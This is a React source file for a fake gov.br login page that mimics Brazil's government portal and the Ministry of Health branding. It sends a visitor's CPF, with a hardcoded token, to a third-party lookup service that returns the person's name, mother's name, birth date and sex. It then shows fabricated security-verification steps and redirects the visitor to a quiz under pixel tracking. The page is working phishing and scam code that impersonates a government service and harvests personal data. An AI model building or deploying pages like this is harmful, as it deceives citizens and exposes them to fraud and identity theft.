import React, { useState, useEffect, useRef } from 'react';
import useUtmNavigator from '../hooks/useUtmNavigator';
import { useUser } from '../context/UserContext';
import { usePixelTracking } from '../hooks/usePixelTracking';
import axios from 'axios';

interface UserInfo {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?: UserInfo }> => {
  const numericCPF = cpf.replace(/\D/g, "");

  if (numericCPF.length !== 11) {
    return { valid: false };
  }

  if (/^(\d)\1{10}$/.test(numericCPF)) {
    return { valid: false };
  }

  let sum = 0;
  for (let i = 0; i < 9; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (10 - i);
  }
  let digit1 = 11 - (sum % 11);
  if (digit1 > 9) digit1 = 0;

  sum = 0;
  for (let i = 0; i < 10; i++) {
    sum += parseInt(numericCPF.charAt(i)) * (11 - i);
  }
  let digit2 = 11 - (sum % 11);
  if (digit2 > 9) digit2 = 0;

  if (parseInt(numericCPF.charAt(9)) !== digit1 || parseInt(numericCPF.charAt(10)) !== digit2) {
    return { valid: false };
  }

  try {
    const response = await axios.get(
      `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`,
      { timeout: 8000 }
    );

    console.log('Resposta da API de LoginCpf:', response.data);

    const body = response.data;

    if (body?.status === 'error' || body?.error) {
      console.warn('CPF API: erro retornado', body);
      return { valid: true };
    }

    let dados = body?.DADOS || body?.dados || body?.data;
    
    if (!dados && Array.isArray(body) && body.length > 0) {
      dados = body[0];
    }
    
    if (!dados && body?.nome) {
      dados = body;
    }

    if (dados && dados.nome) {
      return {
        valid: true,
        data: {
          cpf: dados.cpf || dados.CPF || numericCPF,
          nome: dados.nome || dados.NOME || "",
          nome_mae: dados.nome_mae || dados.MAE || "",
          data_nascimento: dados.data_nascimento || dados.DATA_NASCIMENTO || "",
          sexo: dados.sexo || dados.SEXO || ""
        }
      };
    }
  } catch (err) {
    console.error('Erro ao consultar API de CPF:', err);
  }

  return { valid: true };
};

/* ── Loading steps config ── */
const LOADING_STEPS = [
  'Validando seu CPF na base de dados gov.br',
  'Verificando segurança do dispositivo',
  'Estabelecendo conexão segura',
  'Consultando base de dados',
  'Autorizando acesso',
];

const STEP_INTERVAL = 1800;   // ms per step
const REDIRECT_DELAY = 1200;  // ms after last step before navigating

/* ── Loading Screen ── */
const LoadingScreen: React.FC<{ activeStep: number; progress: number }> = ({ activeStep, progress }) => (
  <div
    className="fixed inset-0 z-50 flex flex-col overflow-hidden"
    style={{
      fontFamily: 'Rawline, Helvetica, Arial, sans-serif',
      backgroundColor: 'rgb(7, 29, 65)',
      backgroundImage: 'radial-gradient(circle, rgba(255,255,255,0.06) 1px, transparent 1px)',
      backgroundSize: '20px 20px',
    }}
  >
    {/* Subtle pattern overlay */}
    <div className="absolute inset-0 opacity-5">
      <div
        className="absolute inset-0"
        style={{
          backgroundImage:
            "url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\")",
        }}
      />
    </div>

    {/* Top bar */}
    <div className="bg-[#071D41] py-2 mt-4 relative z-10">
      <div className="max-w-4xl mx-auto px-4 flex items-center justify-between">
        <img
          src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png"
          alt="gov.br"
          className="h-6 object-contain brightness-0 invert opacity-80"
        />
        <span className="text-[10px] text-white/40 tracking-wider">MINISTÉRIO DA SAÚDE</span>
      </div>
    </div>

    {/* Center content */}
    <div className="flex-1 flex items-center justify-center px-4 flex-col text-center text-white max-w-sm mx-auto relative z-10">
      {/* Spinner */}
      <div className="mb-8">
        <div className="w-16 h-16 mx-auto relative">
          <div
            className="absolute inset-0 rounded-full animate-spin"
            style={{
              borderWidth: 2,
              borderStyle: 'solid',
              borderColor: '#168821 rgba(255,255,255,0.1) rgba(255,255,255,0.1)',
              animationDuration: '1s',
            }}
          />
          <div className="absolute inset-0 flex items-center justify-center text-white/90">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={1.5}
                d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
              />
            </svg>
          </div>
        </div>
      </div>

      <h2 className="text-lg font-medium mb-2">Dispositivo autorizado</h2>
      <p className="text-sm opacity-60 mb-8 leading-relaxed">
        Dispositivo consta na lista de aparelhos autorizados vinculados ao seu CPF.
      </p>

      {/* Progress bar */}
      <div className="w-full max-w-xs mx-auto mb-6">
        <div className="h-0.5 bg-white/10 rounded-full overflow-hidden">
          <div
            className="h-full bg-[#168821] rounded-full"
            style={{ width: `${progress}%`, transition: 'width 0.5s ease' }}
          />
        </div>
      </div>

      {/* Step dots */}
      <div className="flex justify-center gap-2">
        {LOADING_STEPS.map((_, i) => (
          <div
            key={i}
            className="w-2 h-2 rounded-full"
            style={{
              transition: 'all 0.3s',
              backgroundColor: i <= activeStep ? '#168821' : 'rgba(255,255,255,0.15)',
              transform: i === activeStep ? 'scale(1.4)' : 'scale(1)',
            }}
          />
        ))}
      </div>
    </div>

    {/* Bottom info */}
    <div className="py-5 border-t border-white/5 px-4 relative z-10">
      <div className="max-w-md mx-auto">
        <div className="bg-white/5 rounded-lg p-4 backdrop-blur-sm">
          <p className="text-white/50 text-[10px] uppercase tracking-wider mb-2">O que está acontecendo</p>
          <div className="space-y-2">
            {LOADING_STEPS.map((text, i) => (
              <div key={i} className="flex items-center gap-2">
                <div
                  className={`w-1.5 h-1.5 rounded-full ${i <= activeStep ? 'bg-[#009c3b] animate-pulse' : 'bg-white/30'}`}
                />
                <span className={`text-xs ${i <= activeStep ? 'text-white/70' : 'text-white/40'}`}>{text}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  </div>
);

/* ── Main Component ── */
const LoginCpf: React.FC = () => {
  usePixelTracking();
  
  const [cpf, setCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showLoadingScreen, setShowLoadingScreen] = useState(false);
  const [activeStep, setActiveStep] = useState(-1);
  const [progress, setProgress] = useState(0);
  const navigate = useUtmNavigator();
  const { setUserName, setUserData } = useUser();
  const stepTimerRef = useRef<number | null>(null);

  // Animate steps when loading screen is visible
  useEffect(() => {
    if (!showLoadingScreen) return;

    let step = 0;
    let navigated = false;

    setActiveStep(0);
    setProgress((1 / LOADING_STEPS.length) * 100);

    const id = window.setInterval(() => {
      step += 1;

      if (step < LOADING_STEPS.length) {
        setActiveStep(step);
        setProgress(((step + 1) / LOADING_STEPS.length) * 100);
      } else {
        window.clearInterval(id);
        if (!navigated) {
          navigated = true;
          window.setTimeout(() => {
            navigate('/quiz');
          }, REDIRECT_DELAY);
        }
      }
    }, STEP_INTERVAL);

    stepTimerRef.current = id;

    return () => {
      window.clearInterval(id);
    };
  }, [showLoadingScreen]); // eslint-disable-line react-hooks/exhaustive-deps

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 3) return numbers;
    if (numbers.length <= 6) return `${numbers.slice(0, 3)}.${numbers.slice(3)}`;
    if (numbers.length <= 9) return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6)}`;
    return `${numbers.slice(0, 3)}.${numbers.slice(3, 6)}.${numbers.slice(6, 9)}-${numbers.slice(9, 11)}`;
  };

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedCPF = formatCPF(e.target.value);
    if (formattedCPF.length <= 14) {
      setCpf(formattedCPF);
      setError('');
    }
  };

  const handleContinue = async () => {
    if (cpf.length < 14) {
      setError('Digite um CPF válido');
      return;
    }

    setLoading(true);
    setError('');

    try {
      const result = await validateCPFFromAPI(cpf);

      if (!result.valid) {
        setError('CPF inválido');
        setLoading(false);
        return;
      }

      if (result.data) {
        setUserName(result.data.nome);
        setUserData({
          cpf: result.data.cpf,
          nome: result.data.nome,
          nome_mae: result.data.nome_mae,
          data_nascimento: result.data.data_nascimento,
          sexo: result.data.sexo,
        });
      }

      // Show the loading/verification screen instead of navigating immediately
      setShowLoadingScreen(true);
    } catch {
      setError('Erro ao validar CPF. Tente novamente.');
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100" style={{ fontFamily: 'Rawline, sans-serif', lineHeight: 1.5 }}>
      {/* Loading/Verification Overlay */}
      {showLoadingScreen && <LoadingScreen activeStep={activeStep} progress={progress} />}

      {/* Header (gov.br image + icons) */}
      <header style={{ background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', display: 'flex', flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', boxShadow: 'rgba(0, 0, 0, 0.16) 0px 3px 6px', marginBottom: '6px', width: '100%', padding: '0px 10px' }}>
        <div></div>
        <a href="#" style={{ color: 'rgb(51, 51, 51)', fontSize: '0.9em', fontWeight: 500, textDecoration: 'none' }}>
          <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Gov.br" style={{ width: '100px', margin: '10px' }} />
        </a>
        <div className="flex gap-4">
          <i className="fas fa-moon text-base text-blue-600"></i>
          <i className="fas fa-cookie-bite text-base text-blue-600"></i>
        </div>
      </header>

      <div className="container mx-auto p-8" style={{ margin: '0px auto auto' }}>
        <div className="flex justify-center">
          <div className="w-full max-w-md">
            <div className="bg-white rounded-lg shadow-md p-[10px]">
              <h2 className="text-lg font-semibold mb-4 text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '15px' }}>Identifique-se no gov.br com:</h2>

              <div className="flex items-center mb-2">
                <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png" alt="CPF" />
                <span className="text-[#333333]" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>Número do CPF</span>
              </div>

              <p className="text-gray-600 text-sm mb-4" style={{ fontFamily: 'Rawline, sans-serif', fontSize: '12.8px' }}>Digite seu CPF para <span className="font-semibold">criar</span> ou <span className="font-semibold">acessar</span> sua conta gov.br</p>

              <div>
                <label htmlFor="cpf" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>CPF</label>
                <input id="cpf" inputMode="numeric" placeholder="Digite seu CPF" className="shadow text-base text-[#333333] h-[40px] appearance-none border rounded w-full py-2 px-3 leading-tight" maxLength={14} type="text" value={cpf} onChange={handleCPFChange} style={{ fontFamily: 'Rawline, sans-serif', padding: '0px 20px', width: '100%', background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', border: '1px solid rgb(136, 136, 136)', borderRadius: '4px', color: 'rgb(51, 51, 51)', fontSize: '16px' }} />
              </div>

              {error && (
                <div className="mt-3 p-3 bg-red-50 border border-red-200 text-red-700 rounded text-sm">
                  {error}
                </div>
              )}

              <button disabled={loading || cpf.replace(/\D/g, '').length < 11} onClick={handleContinue} className="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 text-primary-foreground hover:bg-primary/90 h-10 w-full py-2 px-4 rounded focus:outline-none focus:shadow-outline font-bold cta-button-primary" style={{ fontFamily: 'Rawline, sans-serif', boxShadow: 'rgba(0, 0, 0, 0.16) 0px 2px 3px', borderRadius: '24px', opacity: (loading || cpf.replace(/\D/g, '').length < 11) ? 0.5 : 1, margin: '30px 0px 25px', backgroundColor: '#1351B4' }}>
                {loading ? 'Validando...' : 'Continuar'}
              </button>

              <p className="text-[#333333] text-sm font-semibold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>Outras opções de identificação:</p>
              <hr className="text-[#333333]" />

              <div className="space-y-2">
                <div className="login-option flex items-center cursor-pointer rounded transition-colors duration-300" style={{ marginTop: '20px' }}>
                  <img alt="Internet Banking" className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png" />
                  <div className="flex items-center">
                    <span className="text-green-700 text-xs">Login com seu banco</span>
                    <span className="ml-2 bg-green-700 text-white text-xs px-1 py-0.5 uppercase font-bold" style={{ fontSize: '8px' }}>SUA CONTA SERÁ PRATA</span>
                  </div>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/app-identidade-govbr.png" alt="App Gov.br" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu aplicativo gov.br</span>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD.png" alt="Certificado Digital" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu certificado digital</span>
                </div>

                <div className="flex items-center cursor-pointer" style={{ marginTop: '20px' }}>
                  <img className="mr-2" src="https://sso.acesso.gov.br/assets/govbr/img/icons/CD-Nuvem.png" alt="Certificado Digital em Nuvem" />
                  <span className="text-[#333333] text-sm" style={{ fontFamily: 'Rawline, sans-serif' }}>Seu certificado digital em nuvem</span>
                </div>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginCpf;
